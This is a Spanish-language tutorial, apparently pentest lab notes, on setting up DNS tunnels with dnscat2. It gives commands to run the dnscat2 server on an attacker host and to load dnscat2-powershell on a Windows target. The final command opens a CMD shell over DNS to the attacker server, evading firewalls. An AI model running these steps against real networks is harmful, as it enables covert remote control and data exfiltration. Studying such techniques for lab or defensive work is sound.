# Tuneles DNS con Dnscat2

dnscat2 es una herramienta que usa el protocolo DNS para crear un canal oculto de comunicación entre dos equipos.

En lugar de hacer consultas DNS normales, envía datos escondidos dentro de las peticiones DNS, normalmente en registros TXT. Así puede exfiltrar información o controlar un equipo de forma cifrada y discreta.

Como el tráfico DNS suele estar permitido en las redes, dnscat2 puede evadir firewalls y sistemas de detección que sí monitorean conexiones HTTP o HTTPS.

## Configuración

### 1. Clonar repositorio y configurar servidor

```bash
# Clonar dnscat2
git clone https://github.com/iagox86/dnscat2.git
# Configurar servidor
cd dnscat2/server/
sudo gem install bundler
sudo bundle install
```

### 2. Iniciar servidor dnscat2

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

El servidor, nos proporcionará la clave secreta, que tendremos que proporcionar a nuestro cliente dnscat2 en el host de Windows para que pueda autenticar y cifrar los datos que se envían a nuestro servidor dnscat2 externo.<br>

## Despliegue en el target

### 1. Clonación de dnscat-powershell

```powershell
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

### 2. Importando dnscat

```powershell
Import-Module .\dnscat2.ps1
```

Una vez importado dnscat2.ps1, podemos usarlo para establecer un túnel con el servidor ejecutándose en nuestro host de ataque. Podemos enviar una sesión de shell CMD a nuestro servidor.

### 3. Enviar shell a nuestro servidor

```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
```
